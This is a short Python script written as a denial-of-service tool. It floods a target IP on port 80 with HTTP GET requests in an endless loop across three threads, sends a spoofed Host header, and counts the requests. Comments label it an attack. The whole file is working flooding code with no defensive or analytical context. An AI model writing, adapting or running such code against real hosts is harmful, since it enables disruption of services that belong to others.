import threading
import socket

#First we need to define a target
TARGET = "192.168.100.1" #My DNS
PORT = 80
FAKE_IP = "182.21.22.32"
i=0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET, PORT))
        s.sendto(("GET /" + TARGET + " HTTP/1.1\r\n").encode('ascii'), (TARGET, PORT))
        s.sendto(("Host: " + FAKE_IP + "\r\n\r\n").encode('ascii'), (TARGET, PORT))
        s.close()
        global i
        i+=1
        print(i)

#We specify three Threads which will be attack a target at the same time
for i in range(3):
    thread = threading.Thread(target=attack)
    thread.start()